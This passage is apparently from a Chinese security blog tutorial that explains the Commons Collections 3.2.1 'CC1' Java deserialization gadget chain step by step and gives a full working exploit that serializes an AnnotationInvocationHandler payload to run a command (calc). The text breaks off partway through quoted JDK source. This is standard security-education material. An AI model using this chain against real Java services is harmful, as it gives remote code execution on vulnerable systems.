<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>利用过程：</p>
<p>Transform接口：</p>
<p>Transform接口提供了一个transform()方法，传入一个对象对对象进行操作之后输出：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114017966.png"></p>
<p>查看实现类（ctrl+h）：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114105893.png"></p>
<p>重要的实现类有<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>、<code>TransformedMap</code></p>
<p>ConstantTransformer类：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114801340.png"></p>
<p>其中的transform()方法不管输入什么都返回一个常量类iConstant，iConstant在构造器中获得</p>
<p>InvokerTransformer类：</p>
<p>构造方法传入可控的方法名(methodName)，方法参数的类型(paramTypes)，调用的参数(iArgs)</p>
<p>tranform()方法传入一个对象，获取这个对象的Class原型。。一整条下来是一个非常非常完美的反射链调用方法的过程</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108145428517.png"></p>
<p>这样即可触发计算器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里为 InvokerTransformer 类中的 transform()方法传入Runtime实例，同时通过构造方法传入了exec方法以及需要的参数类型(String.class)和参数值(calc)，我们之前提到了 transform 方法中的反射调用，所以成功弹出计算器。</p>
<p>ChainedTransformer类：</p>
<p>ChainedTransformer类实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法，并且将上一个transform方法返回的类传递给下一个进行调用，形成(N….transform(C.transform(B.transform(A.transform(Object)))))这样的一条链，数组的下一个元素对象执行数组的上一个元素对象的方法。</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108142522597.png"></p>
<p>到这里为止可以构造一条链了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc.exe&quot;</span>;<br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;<span class="hljs-comment">//获取到了getRuntime方法</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;<span class="hljs-comment">//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span><br>                            <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>            &#125;;<br>            <span class="hljs-comment">// 创建ChainedTransformer调⽤链对象</span><br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformedChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-comment">// 执⾏对象转换操作</span><br>            transformedChain.transform(<span class="hljs-literal">null</span>);<br><br><br><br>        &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>



<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109004511915.png"></p>
<p>接下来就是看谁调用了InvokerTransformer类中的transformer()方法了，在寻找过程中如果发现a()方法调用了transformer()方法，就去找谁调用了a()方法，直到找到readObject()</p>
<p>TransformedMap类：</p>
<p>其checkSetValue()方法调用了transform()方法，跟进valueTransformer</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014536461.png"></p>
<p>构造方法中给valueTransform赋值，</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014742419.png"></p>
<p>但是构造方法为protected，在类里找，发现decorate()方法调用了构造器，可用于调用g构造函数</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014804849.png"></p>
<p>继续寻找谁调用了checkSetValue()方法：</p>
<p>在TransformedMap类的父类 AbstractInputCheckedMapDecorator下定义了类EntryMap类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>    <span class="hljs-comment">/** The parent map */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(entry);<br>        <span class="hljs-built_in">this</span>.parent = parent;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        value = parent.checkSetValue(value);<br>        <span class="hljs-keyword">return</span> entry.setValue(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中setValue()方法下调用了checkSetValue()方法，而这里的setValue()方法与Map.Entry下的相同</p>
<p><img src="/image-20231121212303111.png" alt="image-20231121212303111"></p>
<p>只需要传入的参数合适便能达到预期目的，关于Java中的Entry类：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/2839888494xw/p/15042850.html">https://www.cnblogs.com/2839888494xw/p/15042850.html</a></p>
<p>通过Map.entrySet()方法，获取到键值对，然后循环遍历，对每个键值对执行setValue()方法，便等同于执行了MapEntry下的setValue()方法，进而调用checkSetValue()方法，因为checkSetValue()只修改valueTransformer的值，所以decorate的时候只需要在键值的位置传入需要调用transform()方法的类</p>
<p>测试一下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ser.impl.MapEntrySerializer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc.exe&quot;</span>;<br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;<span class="hljs-comment">//获取到了getRuntime方法</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;<span class="hljs-comment">//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span><br>                            <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>            &#125;;<br>            <span class="hljs-comment">// 创建ChainedTransformer调⽤链对象</span><br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformedChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-comment">// 执⾏对象转换操作</span><br><span class="hljs-comment">//            transformedChain.transform(null);</span><br>            Map&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            map.put(<span class="hljs-string">&quot;potato&quot;</span>,<span class="hljs-string">&quot;CC&quot;</span>);<br>            Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,transformedChain);<br>            <span class="hljs-keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;<br>                entry.setValue(<span class="hljs-string">&quot;any&quot;</span>);<br>            &#125;<br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>合理猜想对transformedMap调用put()方法时会调用setValue()方法，毕竟增加了键值对必然要set，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,transformedChain);<br>transformedMap.put(<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;gg&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>发现也可以调用</p>
<p>下一步就要找谁的readObject()调用了setValue()方法：</p>
<p>AnnotationInvocationHandler类：</p>
<p>在这之前先手动导入一下sun包，</p>
<p>先<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">安装jdk源码</a>：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111314683.png"></p>
<p>在自己的jdk目录下将src压缩包解压</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111508088.png"></p>
<p>sun包copy到jdk的src目录下：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122113329914.png"></p>
<p>添加库：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122112147020.png"></p>
<p>查找setValue()用法时便能看到被AnnotationInvocationHandler的readObject()方法调用了，同时注意到该类不是public，只能在当前包下访问：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122114338097.png"></p>
<p>既然不是public，那就可以使用强大的反射来调用</p>
<p>最终exp：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ser.impl.MapEntrySerializer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;<span class="hljs-comment">//获取到了getRuntime方法</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;<span class="hljs-comment">//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span><br>                            <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>            &#125;;<br>            <span class="hljs-comment">// 创建ChainedTransformer调⽤链对象</span><br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformedChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-comment">// 执⾏对象转换操作</span><br><span class="hljs-comment">//            transformedChain.transform(null);</span><br>            Map&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;CC&quot;</span>);<br>            Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,transformedChain);<br><span class="hljs-comment">//            transformedMap.put(&quot;h&quot;,&quot;hh&quot;);</span><br><span class="hljs-comment">//            for (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">//                entry.setValue(&quot;any&quot;);</span><br><span class="hljs-comment">//            &#125;</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>            <span class="hljs-comment">//创建构造器</span><br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);<br>            constructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class,transformedMap);<br>            serialize(obj);<br>            unserialize(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>));<br>            outputStream.writeObject(o);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span>  objectInputStream.readObject();<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>为什么是在构造函数第一个参数传入Target.class呢？这里跳到AnnotationInvocationHandler的构造函数处，可以看到第一个参数是一个Class的泛型，继承了注解的Annotation类，下面的if判断要求第一个参数isAnnotation()必须返回true，即必须是一个注解的类，Target是注解，当然Override也是，继续往下看</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124173103719.png"></p>
<p>会发现Target有一个value()方法，而Override没有</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202726171.png"></p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202758635.png"></p>
<p>在测试的时候发现只有put的键为”value”时才能触发反序列化，那为什么put()的键需要是”value”呢？</p>
<p>我们去看最后的readObject()的重写：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span 